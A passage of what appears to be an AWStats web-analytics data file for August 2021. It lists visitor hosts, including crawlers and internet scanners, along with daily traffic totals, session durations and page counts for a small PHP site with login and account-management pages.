+11.204.16.185.baremetal.zare.com 2 2 6990 20210811015931
+crawl21.bl.semrush.com 1 1 7431 20210811094131
+40.113.198.78 2 2 22450 20210814005537
+22-128.206.104.serverhubrdns.in-addr.arpa 1 1 11225 20210819044403
+msnbot-40-77-167-78.search.msn.com 1 1 2293 20210802051716
+msnbot-40-77-167-88.search.msn.com 1 14 26398 20210808085216
+census4.shodan.io 1 1 11225 20210810034423
+softbank126078099131.bbtec.net 1 10 1262873 20210816141050
+petalbot-114-119-139-19.petalsearch.com 1 1 2293 20210824222702
+unn-84-17-48-164.cdn77.com 3 3 23898 20210817102554
+crawl5.bl.semrush.com 1 1 2293 20210816092235
+zl-dal-us-gp1-wk121.internet-census.org 1 1 3495 20210808072427
+152.32.144.236 6 8 71178 20210810162200
+49.234.47.214 1 1 3495 20210818000956
+41.199.135.34.bc.googleusercontent.com 1 1 11225 20210807014023
+zl-ams-nl-gp3-wk103.internet-census.org 9 9 31455 20210824155024
+ec2-100-21-218-158.us-west-2.compute.amazonaws.com 2 2 6990 20210820020657
+193.122.98.10 2 2 6990 20210819223019
+li1254-201.members.linode.com 1 1 3495 20210820053747
+zl-dal-us-gp3-wk108.internet-census.org 7 7 24465 20210824102027
+blue.census.shodan.io 1 1 11225 20210802061248
+census8.shodan.io 1 1 11225 20210822230255
+64.62.197.152 2 2 22450 20210818102229
+150.109.114.14 1 1 3495 20210819170903
+61.135.15.183 1 2 13139 20210811093844
+p4930170-ipngn25401marunouchi.tokyo.ocn.ne.jp 1 10 1262873 20210802161638
+42.192.17.155 2 2 6990 20210820060156
+zl-dal-us-gp3-wk107.internet-census.org 10 10 34950 20210822165906
+petalbot-114-119-139-207.petalsearch.com 3 3 24081 20210822231150
+li1744-226.members.linode.com 1 1 3495 20210806050243
+77.247.110.9 1 1 3495 20210814162214
+104.248.93.168 2 2 6990 20210813050151
+170.130.187.54 1 1 11225 20210811081650
+146.70.8.12 2 2 17461 20210811174008
+sh-phx-us-gp1-wk110.internet-census.org 1 1 3495 20210822160215
+unn-195-181-161-13.datapacket.com 3 3 23898 20210803041535
+181.214.206.181 1 1 3495 20210815054500
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 24
+20210801 21 23 223822 20
+20210802 33 46 1441906 23
+20210803 37 56 2695952 31
+20210804 19 20 88871 19
+20210805 29 33 165916 21
+20210806 39 43 288463 23
+20210807 25 26 352556 21
+20210808 27 35 155465 26
+20210809 19 31 1365383 16
+20210810 36 38 213852 26
+20210811 37 54 582538 33
+20210812 35 42 628924 23
+20210813 29 30 113005 26
+20210814 30 33 164505 27
+20210815 32 34 164350 28
+20210816 54 100 6662912 29
+20210817 58 95 4135760 29
+20210818 27 28 116373 24
+20210819 85 181 9482869 39
+20210820 35 46 1445278 30
+20210821 23 23 133562 20
+20210822 46 46 321382 35
+20210823 42 62 1526388 30
+20210824 30 45 1441685 24
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 6
+15mn-30mn 4
+5mn-15mn 7
+30s-2mn 10
+2mn-5mn 3
+30mn-1h 7
+0s-30s 592
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_SIDER 23
+/ 632 3443625 526 498
+/contact.php 64 381293 6 36
+/login.php 37 85521 18 15
+/signup.php 22 41604 19 19
+/terms.php 21 276255 20 21
+/reset-password.php 8 15936 6 5
+/index.php 8 27960 3 0
+/help.php 7 52017 6 6
+/privacy-policy.php 7 12138 7 7
+/personal-info.php 6 21906 6 6
+/manage/deposit/edit/ 4 18371 0 0
+/complete-password.php 2 3864 0 0
+/manage/data/ 5 17559 0 2
+/new-password.php 2 3866 0 0
+/company-signup.php 2 30462 2 2
+/manage/clients/ 2 5488 0 1
+/manage/estimates/ 2 5404 0 1
+/change-password.php 5 11230 0 0
+/personal-signup.php 4 59964 3 3
+/test/ 1 3691 0 1
+/manage/deposit/ 3 8076 1 0
+/manage/deposit/edit/dep_insert.php 3 180 0 0
+/manage/invoices/ 1 2545 0 0
+END_SIDER
